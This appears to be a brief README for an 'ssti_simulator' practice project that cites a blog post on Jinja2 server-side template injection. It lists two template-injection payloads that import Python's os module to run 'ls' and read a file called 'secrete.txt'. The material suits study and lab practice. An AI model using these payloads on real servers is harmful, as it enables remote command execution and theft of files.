# ssti_simulator
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

{{ request.application.__globals__.__builtins__.__import__('os').popen('cat secrete.txt').read() }}